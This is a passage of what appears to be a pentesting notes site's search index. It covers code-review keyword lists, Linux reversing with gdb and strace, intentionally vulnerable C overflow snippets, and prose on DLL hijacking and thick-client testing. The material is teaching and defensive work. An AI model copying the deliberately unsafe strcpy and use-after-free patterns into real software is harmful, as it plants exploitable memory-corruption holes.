SEARCH java.lang.Runtime.exec java.lang.Runtime.getRuntime getId"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-java/#logging","title":"Logging","text":"<p>We may come across some information leakage by examining code below contained in one\u2019s application.</p> STRING TO SEARCH java.io.PrintStream.write log4j jLo Lumberjack MonoLog qflog just4log log4Ant JDLabAgent"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-java/#ajax-and-javascript","title":"Ajax and JavaScript","text":"<p>Look for Ajax usage, and possible JavaScript issues:</p> STRING TO SEARCH document.write eval document.cookie window.location document.URL document.URL"},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-javascript-and-ajax/","title":"Securev Code Review in JavaScript and AJAX","text":""},{"location":"Pentesting/Secure%20Code%20Review/manual-code-crawling/searching-for-code-in-javascript-and-ajax/#securev-code-review-in-javascript-and-ajax","title":"Securev Code Review in JavaScript and AJAX","text":"<p>Ajax and JavaScript have brought functionality back to the client side, which has brought a number of old security issues back to the forefront. The following keywords relate to API calls used to manipulate user state or the control the browser. The advent of AJAX and other Web 2.0 paradigms has pushed security concerns back to the client side, but not excluding traditional server side security concerns. Look for Ajax usage, and possible JavaScript issues.</p> STRING TO SEARCH eval document.cookie document.referrer document.attachEvent document.body document.body.innerHtml document.body.innerText document.close document.create document.execCommand document.forms[0].action document.location document.open document.URL document.URLUnencoded document.write document.writeln location.hash location.href location.search window.alert window.attachEvent window.createRequest window.execScript window.location window.open window.navigate window.setInterval window.setTimeout XMLHTTP"},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/basics/","title":"Basics","text":""},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/basics/#basics","title":"Basics","text":""},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/basics/#basics-of-linux","title":"Basics of Linux","text":""},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/basics/#what-is-linux","title":"What is Linux?","text":"<p>Linux is based on the Unix operating system developed in the 1970s at AT\\&amp;T Bell Labs. Unix is known for being a powerful and reliable operating system that is used on a wide range of computers, from small devices like smartphones to large servers that run websites and other services. Linux is a version of Unix that was created by Linus Torvalds in the 1990s. It is an open-source operating system, which means that the source code is available for anyone to view, modify, and distribute. This has made Linux popular with developers and others who want to customize their operating systems to meet their specific needs. It support multitasking, multiuser, n/w and virtual application &amp; wide varieties of n/w networking protocols &amp; configurations</p> <p>Linux has mainly two parts, Kernel &amp; Set of commands and applications.</p> <p>Kernel deals with program execution, memory management, and I/O operations.</p> <p>Set of commands and applications deals with language compilers, video tools, web browsers etc.</p>"},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/basics/#features-of-linux","title":"Features of Linux","text":"<ul> <li>Multi-User &amp; Multi-Tasking</li> <li>GUI</li> <li>No constant rebooting required</li> <li>Hierarchical file system</li> <li>Downloadable Applications</li> <li>Start/Stop services without interrupting others</li> </ul>"},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/basics/#architecture","title":"Architecture","text":"<ul> <li>Hardware</li> <li>Kernel<ul> <li>Shell</li> <li>Utilities<ul> <li>Apps</li> <li>Compiler</li> <li>Group</li> <li>UI etc</li> </ul> </li> </ul> </li> </ul> <p>Hardware Layer It is the core of Linux. It consists of all peripheral devices.</p> <p>Kernel layer A collection of routines. It is loaded into memory management when the system is booted. Communicates directly with the hardware. It also has various tasks, such as task scheduling, resource management, and I/O operation.</p> <p>Shell It is a user interface that helps users interact with Linux O.S. we can also call it the UI between the User and OS.</p> <p>Utilities &amp; Application Programs These allow us to interact with the system in a better manner. User-customized applications are included in this layer. e.g. Text Editor, Video applications.</p> <p>On Linux, the extensions for executables are typically either <code>.sh</code> for shell scripts, or <code>.bin</code> for binary executables. However, there is no requirement for executables to have any particular extension on Linux, and it is common for executables to have no extension at all.</p> <p>In addition to <code>.sh</code> and <code>.bin</code>, other common extensions for executables on Linux include <code>.out</code>, <code>.elf</code>, and <code>.run</code>. However, these extensions are not universally used, and an executable may have any or no extension.</p> <p>You can use the command to determine whether a file is executable on Linux. For example:</p> <pre><code>$ file /usr/bin/ls\n/usr/bin/ls: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=9b17e52b45b2f7b2a0a40a7c27ed9a9a7cc8c485, stripped\n</code></pre> <p>The output of the <code>file</code> command indicates that <code>/usr/bin/ls</code> is an ELF (Executable and Linkable Format) binary executable for 64-bit systems.</p> <p>Alternatively, you can use the <code>ls -l</code> command to display a file's permissions. It is executable if a file has  \\  permission set for the owner, group, or other users. For example:</p> <pre><code>$ ls -l /usr/bin/ls\n-rwxr-xr-x 1 root root 113592 Dec  16  2022 /usr/bin/ls\n</code></pre> <p>The <code>-rwxr-xr-x</code> permissions string indicates that the file is an executable, as the <code>x</code> permission is set for the owner, group, and other users.</p>"},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/buffer-overflow/","title":"Buffer overflow","text":""},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/buffer-overflow/#buffer-overflow","title":"Buffer overflow","text":"<p>Buffer overflow is a type of vulnerability that occurs when a program writes more data to a buffer than it is designed to hold. This can cause the buffer to overflow and overwrite adjacent memory, potentially allowing an attacker to execute arbitrary code or crash the program.</p> <p>Here is a simple example of a buffer overflow vulnerability in C:</p> <pre><code>#include &lt;string.h&gt;\nint main(int argc, char *argv[])\n{\n    char buffer[8];\n    strcpy(buffer, argv[1]);\n    return 0;\n}\n</code></pre> <p>This program has a buffer of size 8, but it uses the <code>strcpy</code> function to copy an argument from the command line into the buffer without checking the size of the argument first. If the argument is longer than 8 characters, it will cause the buffer to overflow and overwrite adjacent memory.</p> <p>To exploit this vulnerability, an attacker could provide a long string as an argument, which would be copied into the buffer and then overflow into adjacent memory. This could allow the attacker to execute arbitrary code or crash the program.</p> <p>To prevent buffer overflow vulnerabilities, it is important to use functions that check the size of the input and ensure that it does not exceed the size of the buffer. In the example above, the <code>strncpy</code> function could be used instead of <code>strcpy</code> to specify the maximum number of characters to copy. It is also a good idea to use compile-time protections such as stack canaries and address space layout randomization (ASLR).</p> <p>There are main 2 types of buffer overflow:</p> <ol> <li>Stack Overflow</li> <li>Heap Buffer Overflow</li> </ol>"},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/buffer-overflow/#stack-overflow","title":"Stack Overflow","text":"<p>Stack overflow is a type of runtime error that occurs when a program attempts to push more data onto the stack than the stack is able to hold. The stack is a region of memory used to store a program's local variables and function call information.</p> <p>In C and C++, stack overflow can occur when a function recurses too deeply or when a large array is declared on the stack. It can also occur when a program uses a buffer overflow vulnerability to overflow the stack and overwrite adjacent memory.</p> <p>Here is an example of a stack overflow in C:</p> <pre><code>#include &lt;stdio.h&gt;\n\nvoid recurse(int depth)\n{\n    char buffer[1024];  // declare a large array on the stack\n    recurse(depth + 1); // recurse indefinitely\n}\n\nint main(int argc, char *argv[])\n{\n    recurse(0);\n    return 0;\n}\n</code></pre> <p>In this example, the <code>recurse</code> function calls itself indefinitely, causing the stack to grow larger and larger with each recursive call. Eventually, the stack will overflow, and the program will crash.</p> <p>To prevent stack overflow, it is important to avoid recursing too deeply and to use heap-allocated memory instead of stack-allocated memory for large data structures. It is also a good idea to use compile-time protections such as stack canaries and address space layout randomization (ASLR).</p> <p>Heap overflow is a type of vulnerability that occurs when a program writes more data to the heap than it is designed to hold. The heap is a region of memory that is used for dynamic memory allocation, which means that it is used to allocate memory at runtime for data structures that are created and destroyed during the execution of a program.</p> <p>Heap overflows can occur when a program uses a buffer overflow vulnerability to overflow a heap-allocated buffer and overwrite adjacent memory. They can also occur when a program frees a block of memory and then reuses it without properly initializing it, allowing an attacker to write arbitrary data to the freed memory.</p> <p>Here is an example of a heap overflow in C:</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, char *argv[])\n{\nchar *buffer = malloc(8);  // allocate a buffer on the heap\nstrcpy(buffer, argv[1]);   // copy an argument from the command line into the buffer\nfree(buffer);              // free the buffer\nstrcpy(buffer, argv[2]);   // reuse the freed buffer without initializing it\nreturn 0;\n}\n</code></pre> <p>In this example, the program uses the <code>malloc</code> function to allocate a buffer on the heap and then uses the <code>strcpy</code> function to copy an argument from the command line into the buffer. It then frees the buffer using the <code>free</code> function but then reuses the freed buffer without initializing it. If the second argument is longer than 8 characters, it will cause the buffer to overflow and overwrite adjacent memory on the heap.</p> <p>To prevent heap overflow vulnerabilities, it is important to use functions that check the size of the input and ensure that it does not exceed the size of the buffer. In the example above, the <code>strncpy</code> function could be used instead of <code>strcpy</code> to specify the maximum number of characters to copy. It is also a good idea to use heap allocators that include additional security features such as heap metadata randomization and use-after-free detection.</p>"},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/buffer-overflow/#potentially-vulnerable-functions-in-c","title":"Potentially vulnerable functions in C","text":"<ul> <li>printf()</li> <li>sprintf()</li> <li>strcat()</li> <li>strcpy()</li> <li>gets()</li> </ul>"},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/reversing-linux-applications/","title":"Reversing Linux Applications","text":""},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/reversing-linux-applications/#reversing-linux-applications","title":"Reversing Linux Applications","text":""},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/reversing-linux-applications/#static-analysis","title":"Static Analysis","text":"<p>Let's start with reversing basic Linux executable files.</p> <p>Build the executable with the C Program</p> <p>Install GCC compiler <code>sudo apt install gcc</code></p> <p></p> <p>Build the first program in c, which results in an executable. In this example, we have one simple hello program which results in output to print hello world.</p> <p></p> <p>Once the program is written, we need to compile it with GCC., as shown below. You can see that it will result in the executable file. We can use the `file` command in Linux to check the file type.</p> <p></p> <p>ELF (Executable and Linkable Format) is a common file format for executables, object code, shared libraries, and core dumps on Linux and other Unix-like systems. ELF files can be either 32-bit or 64-bit, depending on the architecture of the system they are intended to run on.</p> <p>As we have confirmed that the binary is executable, we can execute it as follow. <code>./Filename</code></p> <p></p> <p>We just built our first executable file. Let's see how we can reverse it. But before that, quickly rename the package by using <code>mv a.out hello</code> it for better handling. Otherwise, we can also give a name by ourselves when building the executable. using <code>gcc hello-world.c -o hello</code></p> <p>We can start reversing by looking into the strings of the binary. let's see how to do that.</p> <p><code>strings hello</code></p> <p></p> <p>As you can see, we can successfully retrieve the <code>hello world</code>  string from our binary. Now while analyzing any real-world application, this can be anything secrets, passwords, tokens etc. </p> <p>Not only this, there is a lot of other information we can extract from, and it will help us to know binary better.</p> <ul> <li><code>/lib64/ld-linux-x86-64.so.2</code>: This is the path to the dynamic linker on a 64-bit Linux system. The dynamic linker is a program that is responsible for loading and linking shared libraries at runtime.</li> <li><code>__cxa_finalize</code>: This is a function in the C++ standard library that is called to perform cleanup tasks when a program terminates. It is usually used to deallocate memory and release resources acquired during the program's lifetime.</li> <li><code>__libc_start_main</code>: This is a function in the C standard library responsible for starting a C program's main function. It is called by the dynamic linker when a program is executed.</li> <li><code>puts</code>: This function in the C standard library is used to output a string to the standard output stream (usually the console).</li> <li><code>libc.so.6</code>: This is the name of the C standard library on a Linux system. It is a shared library that provides a variety of functions that are used by most programs.</li> <li><code>GLIBC_2.2.5</code>: This is a version number for the GNU C library, which is the implementation of the C standard library used on most Linux systems.</li> <li><code>GLIBC_2.34</code>: This is another version number for the GNU C library.</li> <li><code>GCC: (Debian 12.2.0-3) 12.2.0</code>: This is information about the compiler that was used to build the program. It indicates that the program was compiled with the GCC compiler on a Debian system, and the version of the compiler is 12.2.0.</li> </ul> <p>Disassembling is the process of translating machine code (the instructions that a computer can execute directly) into a human-readable representation of those instructions. This representation is called assembly code, and it is typically written in a programming language called assembly language.</p> <p>Disassembling is often used to reverse engineer a program or to understand how it works. It can also be used to modify the behaviour of a program by modifying the assembly code and then reassembling it.</p> <p>Now disassemble the code by using <code>objdump</code> the command. As you can see follow, we have disassembled the code. Check what's in the disassembled code.</p> <p></p> <p>It shows the working of each execution function, what the function is doing and how it's doing.</p>"},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/reversing-linux-applications/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Dynamic analysis is a technique that involves executing a program and observing its behaviour while it is running. It is often used to identify and debug problems in a program or to understand how the program works and what it does.</p> <p>Various tools and techniques can be used to perform dynamic analysis of a Linux application. </p>"},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/reversing-linux-applications/#some-common-dynamic-analysis-approaches","title":"Some Common dynamic analysis approaches","text":"<ul> <li>Debugging: Debuggers are tools that allow you to execute a program line by line and inspect the values of variables and registers at each step. This can help you understand how a program is working and identify problems. Some popular debuggers for Linux include GDB, LLDB, and Valgrind.</li> <li>Tracing: Tracing tools allow you to record the execution of a program and analyze the resulting trace to understand how the program is working. Tracing can be used to identify performance bottlenecks, understand how a program interacts with the operating system and other programs, and more. Some popular tracing tools for Linux include strace, ltrace, and perf.</li> <li>Monitoring: Monitoring tools allow you to observe the behaviour of a program in real-time and capture metrics such as CPU and memory usage, network activity, and more. This can help you identify problems and optimize the performance of a program. Some popular monitoring tools for Linux include top, htop, and sar.</li> </ul> <p>First, we look for tracing:</p>"},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/reversing-linux-applications/#few-examples-with-various-tools","title":"Few examples with various tools","text":"<ol> <li>ltrace ./hello</li> </ol> <p>2.  strace ./hello</p> <p></p> <p>3. gdb ./hello</p> <p>GDB (GNU Debugger) is a free, open-source debugger that can be used to troubleshoot and debug programs written in C, C++, and other languages. GDB allows you to execute a program in a controlled environment, pause its execution at any point, and examine the state of the program at that point in time.</p> <p>To use GDB, you will first need to compile your program with debugging symbols enabled. This will allow GDB to map the execution of your program to the source code and provide you with more detailed information about the state of the program.</p> <p>To start GDB, you can type \"gdb\" followed by the name of the executable file that you want to debug. Once GDB is running, you can use a variety of commands to control the execution of the program and examine its state. </p>"},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/reversing-linux-applications/#common-gdb-commands","title":"Common GDB Commands","text":"<ul> <li><code>break</code>: Set a breakpoint at a specific line of code or function.</li> <li><code>run</code>: Start execution of the program.</li> <li><code>step</code>: Execute the next line of code and pause.</li> <li><code>next</code>: Execute the next line of code, but skip over function calls.</li> <li><code>continue</code>: Continue execution of the program until the next breakpoint is reached.</li> <li><code>print</code>: Print the value of a variable or expression.</li> </ul> <p>GDB also has a number of other features, such as support for debugging multiple threads and processes, the ability to examine memory contents, and the ability to attach to and debug running processes</p> <p></p> <p>We can also disassemble the function we want, as shown in the following example.</p> <p></p> <p>We can set breakpoints and then analyze the file, such as setting breakpoints and then execute them one by one to analyze. please check the following example where we have set three breakpoints and then <code>run</code> to move on <code>next</code> breakpoint we can use <code>next</code> command</p> <p></p> <p>This is a short brief about tracing the binary and dynamic analysis of the application.</p>"},{"location":"Pentesting/Thick%20Client/linux-application-pentesting/reversing-linux-applications/#monitoring","title":"Monitoring","text":"<p>Top is a command-line utility that displays information about the running processes on a system, including their CPU and memory usage. Htop is a similar tool that has a graphical interface and additional features such as the ability to kill processes. Sar is a system performance monitoring tool that allows you to collect and view data on various system resources over time.</p> <p>top command:</p> <p></p> <p></p> <p>htop command:</p> <p></p> <p></p> <p>These tools can be useful for understanding how a program is using system resources and for identifying performance issues. They can also be used in combination with other tools and techniques, such as debugging and tracing, to get a more complete picture of a program's behavior.</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/architecture/","title":"Thick Client Architectures","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/architecture/#thick-client-architectures","title":"Thick Client Architectures","text":"<p>When conducting penetration testing on thick clients, understanding the underlying architectures is crucial. Thick clients often operate within either a two-tier or three-tier architecture, each with its own characteristics and security implications.</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/architecture/#two-tier-architecture","title":"Two-Tier Architecture","text":"<p>In a two-tier architecture, the client communicates directly with the server without any intermediaries. This setup is akin to a traditional client-server model, where the client sends requests directly to the server, and the server responds accordingly.</p> <p></p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/architecture/#example-applications","title":"Example Applications","text":"<ul> <li>Desktop Games</li> <li>Music Players</li> <li>Text Editors</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/architecture/#three-tier-architecture","title":"Three-Tier Architecture","text":"<p>The three-tier architecture introduces an additional layer between the client and the server, known as the Application Server. This intermediary server facilitates communication between the client and the database server, handling data transmission back and forth.</p> <p></p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/architecture/#example-applications_1","title":"Example Applications","text":"<ul> <li>Firefox</li> <li>Chrome</li> <li>Burp Suite</li> <li>Zap Proxy</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/architecture/#additional-considerations","title":"Additional Considerations","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/architecture/#security-implications","title":"Security Implications","text":"<ul> <li>Two-Tier: Direct communication between client and server may expose vulnerabilities such as lack of encryption or authentication mechanisms.</li> <li>Three-Tier: The presence of an Application Server adds complexity to the architecture, potentially introducing additional attack vectors or points of failure.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/architecture/#penetration-testing-focus-areas","title":"Penetration Testing Focus Areas","text":"<ul> <li>Authentication Mechanisms: Assess the strength of authentication methods employed by both client and server components.</li> <li>Data Transmission Security: Evaluate the encryption protocols and data protection measures during transmission between client, Application Server, and database server.</li> <li>Session Management: Examine how sessions are managed and secured across the architecture to prevent session hijacking or fixation.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/assembly-analysis/","title":"Assembly Analysis","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/assembly-analysis/#assembly-analysis","title":"Assembly Analysis","text":"<p>Delving into the depths of application security often requires analyzing the application at the binary level through decompilation and examination. This process allows us to uncover potential vulnerabilities and assess the overall security posture of the application. Here's a systematic approach to conducting assembly analysis for security assessment:</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/assembly-analysis/#decompilation-and-code-readability","title":"Decompilation and Code Readability","text":"<p>When decompiling the application, the readability of the code serves as an initial indicator of whether the code is obfuscated or not. Obfuscated code can pose significant security risks as it makes it harder to understand and analyze the application's behavior.</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/assembly-analysis/#sensitive-information-extraction","title":"Sensitive Information Extraction","text":"<p>Upon obtaining the source code from memory pages, it's crucial to search for sensitive hardcoded information that could lead to security breaches. This includes passwords, encryption keys, API secrets, or any other critical information embedded within the code.</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/assembly-analysis/#binary-protection-assessment","title":"Binary Protection Assessment","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/assembly-analysis/#using-get-pesecurity","title":"Using <code>Get-PESecurity</code>","text":"<p>The <code>Get-PESecurity</code> tool is invaluable for checking the binary's protection mechanisms. Below are key elements to evaluate:</p> <ul> <li> <p>ASLR (Address Space Layout Randomization): Prevents memory corruption vulnerabilities by randomizing the memory layout.</p> </li> <li> <p>DEP (Data Execution Prevention): Marks certain memory pages as non-executable, preventing code execution from these regions.</p> </li> <li> <p>SafeSEH (Safe Structured Exception Handlers): Enhances exception handling in Windows binaries to prevent exploitation.</p> </li> <li> <p>StrongNaming: Signing the assembly with a key to ensure its integrity and prevent conflicts.</p> </li> <li> <p>Authenticode: Verifies the authenticity and integrity of signed software, preventing tampering.</p> </li> <li> <p>ControlFlowGuard (CFG): Mitigates memory corruption vulnerabilities by validating the integrity of the control flow.</p> </li> <li> <p>HighEntropyVA: Supports high-entropy 64-bit ASLR for enhanced security.</p> </li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/assembly-analysis/#additional-checks","title":"Additional Checks","text":"<ul> <li>Code Signing: Use <code>signcheck.exe</code> from Sysinternals tools to verify if the application is signed, ensuring authenticity and integrity.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/assembly-analysis/#reference","title":"Reference","text":"<ul> <li>https://github.com/NetSPI</li> <li>https://learn.microsoft.com/en-us/sysinternals/</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/buffer-overflow/","title":"Buffer Overflow","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/buffer-overflow/#buffer-overflow","title":"Buffer Overflow","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/buffer-overflow/#definition","title":"Definition","text":"<ul> <li>Occurs when a program writes more data to a buffer than it can hold or writes data beyond the allocated buffer size.</li> <li>Can lead to data corruption, program crashes, or execution of malicious code.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/buffer-overflow/#vulnerable-applications","title":"Vulnerable Applications","text":"<ul> <li>SLmail 5.5</li> <li>Golden FTP Server 4.70</li> <li>Ultra MiniHTTPd 1.2</li> <li>CloudMe 1.11.2</li> <li>Easy File Sharing Web Server 7.2</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/buffer-overflow/#practice-targets","title":"Practice Targets","text":"<ul> <li>These applications are susceptible to stack-based buffer overflow attacks.</li> <li>Practicing on them helps understand and mitigate such vulnerabilities.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/buffer-overflow/#consequences","title":"Consequences","text":"<ul> <li>Data Corruption: Overwriting adjacent memory can corrupt data structures.</li> <li>Program Crashes: Writing beyond buffer boundaries can cause the program to crash.</li> <li>Malicious Code Execution: Attackers can exploit buffer overflow vulnerabilities to inject and execute arbitrary code.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/buffer-overflow/#mitigation-techniques","title":"Mitigation Techniques","text":"<ul> <li>Input Validation: Ensure input data doesn't exceed buffer limits.</li> <li>Bounds Checking: Implement checks to prevent buffer overflow.</li> <li>Use Secure Libraries: Utilize functions that handle buffers safely (e.g., <code>strcpy_s</code> instead of <code>strcpy</code>).</li> <li>Code Reviews: Regularly review code for potential vulnerabilities.</li> <li>Address Space Layout Randomization (ASLR): Randomize memory locations to make it harder for attackers to predict addresses for exploitation.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/dll-hijacking/","title":"DLL Hijacking Vulnerability","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/dll-hijacking/#dll-hijacking-vulnerability","title":"DLL Hijacking Vulnerability","text":"<p>DLL (Dynamic Link Library) Hijacking is a technique utilized by attackers to execute malicious code on a system by exploiting vulnerabilities in applications that improperly load DLL files. By placing a malicious DLL file in a location where a vulnerable application searches for DLL dependencies, an attacker can hijack the application's execution flow and potentially escalate privileges or perform unauthorized actions.</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/dll-hijacking/#understanding-dll-hijacking","title":"Understanding DLL Hijacking","text":"<p>When an application dynamically loads DLL files during runtime, it searches specific directories to locate these DLL dependencies. If the application's search path includes writable or insecure directories, an attacker can place a malicious DLL file with the same name as one of the expected dependencies. When the vulnerable application is executed, it inadvertently loads the attacker-controlled DLL instead of the legitimate one, enabling the execution of malicious code.</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/dll-hijacking/#exploitation-using-procmonexe","title":"Exploitation Using Procmon.exe","text":"<p>DLL Hijacking: </p> <p>The screenshot illustrates the process of DLL hijacking using Procmon.exe. The vulnerable application, in this case, the Damm Vulnerable Thick Client App (DVTA), attempts to load a DLL file from a specific path, which is missing. An attacker can exploit this vulnerability by creating the necessary folder structure and placing a malicious DLL file with the expected name. Upon execution of the DVTA, the malicious DLL is loaded, allowing the attacker to escalate privileges or execute arbitrary code.</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/dll-hijacking/#mitigation-strategies","title":"Mitigation Strategies","text":"<p>To mitigate DLL hijacking vulnerabilities, consider the following measures:</p> <ul> <li> <p>Secure DLL Loading: Applications should employ secure loading mechanisms, such as specifying absolute paths or using cryptographic hash verification to ensure the integrity of loaded DLLs.</p> </li> <li> <p>Reduce Search Paths: Minimize the search paths for DLL loading to only include trusted directories and avoid searching in insecure locations.</p> </li> <li> <p>Code Signing: Digitally signing DLL files can help verify their authenticity and prevent tampering.</p> </li> <li> <p>Regular Updates: Keep applications and system components up-to-date to patch known vulnerabilities and mitigate potential risks.</p> </li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/gui-attacks/","title":"GUI Manipulation","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/gui-attacks/#gui-manipulation","title":"GUI Manipulation","text":"<p>Just as we manipulate HTML elements in web applications, GUI (Graphical User Interface) elements in Windows applications can also be manipulated to achieve various objectives, ranging from bypassing client-side controls to escalating privileges. Understanding how to manipulate GUI elements can uncover hidden functionalities and potential security vulnerabilities.</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/gui-attacks/#tools-for-gui-manipulation","title":"Tools for GUI Manipulation","text":"<p>Several tools facilitate GUI manipulation in Windows applications:</p> <ul> <li> <p>Snoop: A GUI spying tool that allows inspection and manipulation of GUI elements in .NET applications.</p> </li> <li> <p>dnSpy: A powerful .NET debugger and assembly editor that enables the modification and manipulation of .NET assemblies, including GUI elements.</p> </li> <li> <p>ILSpy: A .NET assembly browser and decompiler that assists in analyzing and modifying GUI-related code.</p> </li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/gui-attacks/#manipulation-techniques","title":"Manipulation Techniques","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/gui-attacks/#1-enabledisable-objects","title":"1. Enable/Disable Objects","text":"<ul> <li>Manipulate GUI elements such as text fields and buttons to enable or disable them, potentially granting extra privileges or access to hidden functionalities.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/gui-attacks/#2-discover-hidden-functionalities","title":"2. Discover Hidden Functionalities","text":"<ul> <li>Explore the application's GUI to uncover hidden functionalities, such as admin or higher privileged features, which may lead to privilege escalation or sensitive information disclosure.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/gui-attacks/#3-data-type-and-length-manipulation","title":"3. Data Type and Length Manipulation","text":"<ul> <li>Alter the data types or lengths of methods and functions to bypass client-side controls, such as maximum length restrictions, resulting in potential bypasses.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/gui-attacks/#security-implications","title":"Security Implications","text":"<ul> <li> <p>GUI manipulation can lead to unintended behaviors in Windows applications, potentially exposing vulnerabilities that attackers can exploit.</p> </li> <li> <p>Discovering hidden functionalities or bypassing client-side controls through GUI manipulation may result in privilege escalation or unauthorized access to sensitive information.</p> </li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/gui-attacks/#best-practices","title":"Best Practices","text":"<ul> <li> <p>Secure GUI Development: Implement secure coding practices to ensure robustness and integrity of GUI elements, minimizing the risk of manipulation.</p> </li> <li> <p>Regular Security Assessments: Conduct regular security assessments, including GUI manipulation testing, to identify and remediate potential vulnerabilities proactively.</p> </li> <li> <p>User Education: Educate users about the risks associated with GUI manipulation and encourage them to report any suspicious behavior or unexpected application behavior.</p> </li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/hardcoded-sensitive-information/","title":"Detection of Hardcoded Sensitive Information","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/hardcoded-sensitive-information/#detection-of-hardcoded-sensitive-information","title":"Detection of Hardcoded Sensitive Information","text":"<p>Hardcoding sensitive information such as credentials, server IP addresses, and encryption keys in code or configuration/log files poses significant security risks, potentially leading to severe attacks such as authentication bypass or unauthorized access. It's essential to proactively identify and remove hardcoded sensitive information to mitigate these risks.</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/hardcoded-sensitive-information/#identifying-hardcoded-sensitive-information","title":"Identifying Hardcoded Sensitive Information","text":""},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/hardcoded-sensitive-information/#in-code","title":"In Code","text":"<ul> <li>Review source code, DLLs, or executables for hardcoded sensitive information.</li> <li>Look for instances of plaintext usernames, passwords, API keys, or other credentials.</li> <li>Use tools like dnSpy to decompile and inspect executable files for embedded sensitive data.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/hardcoded-sensitive-information/#in-configurationlog-files","title":"In Configuration/Log Files","text":"<ul> <li>Review configuration files (e.g., .config files) and log files for sensitive information.</li> <li>Check for plaintext storage of credentials, server IP addresses, or encryption keys.</li> <li>Look for sensitive information inadvertently logged during application runtime.</li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/hardcoded-sensitive-information/#tools-for-detection","title":"Tools for Detection","text":"<ul> <li> <p>dnSpy: Decompiler and debugger for .NET applications, useful for inspecting and decompiling executable files to identify hardcoded sensitive information.</p> </li> <li> <p>de4dot.exe: Deobfuscation tool for .NET executables, helpful for deobfuscating obfuscated code to reveal hardcoded sensitive data.</p> </li> </ul>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/hardcoded-sensitive-information/#example-hardcoded-credentials-detection","title":"Example: Hardcoded Credentials Detection","text":"<p>Hardcoded Credentials: </p> <p>In the screenshot above, hardcoded credentials are identified within the Damm Vulnerable Thick Client App (DVTA). These credentials are stored in plaintext within the application code, making them vulnerable to unauthorized access if discovered by malicious actors.</p>"},{"location":"Pentesting/Thick%20Client/windows-application-pentesting/hardcoded-sensitive-information/#mitigation-strategies","title":"Mitigation Strategies","text":"<ul> <li> <p>Avoid Hardcoding Sensitive Information: Instead of hardcoding sensitive information, consider using secure storage mechanisms such as environment variables, secure configuration files, or dedicated credential vaults.</p> </li> <li> <p>Regular Security Audits: Conduct regular security audits to identify and remove hardcoded sensitive information from code and configuration files.</p> </li> <li> <p>Secure Development Practices: Educate developers about the risks associated with hardcoding sensitive information and encourage the 